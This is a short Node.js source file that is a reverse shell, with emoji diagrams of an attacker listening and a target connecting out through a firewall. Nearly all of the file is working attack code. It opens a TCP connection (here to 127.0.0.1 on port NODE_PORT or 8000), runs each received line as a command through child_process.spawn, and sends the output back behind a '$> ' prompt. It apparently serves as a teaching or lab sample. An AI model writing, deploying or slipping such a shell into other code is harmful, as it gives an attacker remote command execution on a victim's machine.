// 
// [Attacker 👂]<---------🧱--[Target ☣]
// 
// [Attacker 👂]----🎯----🧱-->[Target ☣]
const net = require('node:net');
const child_process = require("node:child_process");
const { env } = require('node:process');
const port = env["NODE_PORT"] || 8000;


// Establish Network Connection (TCP)
const client = net.createConnection({host: "127.0.0.1", port}, () => {
    client.write("Connected\r\n$> ");
});

// Wait for instructions
client.on("data", (data) => {
    let cmd = data.toString().trimEnd();
    let args = cmd.split(" ");
    // Execute incoming commands
    let exec = child_process.spawn(args[0], args.slice(1));

    // Send output
    exec.stdout.on("data", out => {
        client.write(out);
        client.write("$> "); 
    });
});

